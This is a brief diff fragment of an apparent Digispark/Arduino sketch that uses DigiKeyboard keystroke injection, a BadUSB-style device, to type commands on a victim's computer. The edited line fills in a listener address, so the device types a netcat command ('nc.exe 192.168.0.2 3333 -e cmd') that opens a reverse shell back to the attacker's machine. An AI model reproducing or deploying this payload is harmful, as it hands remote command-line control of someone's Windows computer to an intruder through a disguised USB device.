@@ -31,7 +31,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
   // connect back to listener with netcat
-  DigiKeyboard.print(".\\nc.exe {listener ip} 3333 -e cmd");
+  DigiKeyboard.print(".\\nc.exe 192.168.0.2 3333 -e cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
